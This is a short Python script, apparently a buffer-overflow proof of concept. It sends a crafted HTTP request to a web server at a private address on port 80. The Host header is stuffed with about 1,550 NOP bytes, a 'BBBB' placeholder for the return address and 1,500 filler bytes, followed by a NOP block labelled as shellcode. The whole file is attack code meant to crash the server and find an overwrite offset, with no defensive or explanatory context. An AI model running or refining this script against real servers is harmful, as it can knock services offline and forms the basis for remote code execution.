#!/usr/bin/python

import socket
import os
import sys

target="192.168.1.169"
crash = "\x90"*1553 + "B"*4 + "C"*1500
shellcode = "\x90"*1500

buffer="GET / HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+= shellcode

one = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
one.connect((target, 80))
one.send(buffer)
one.close()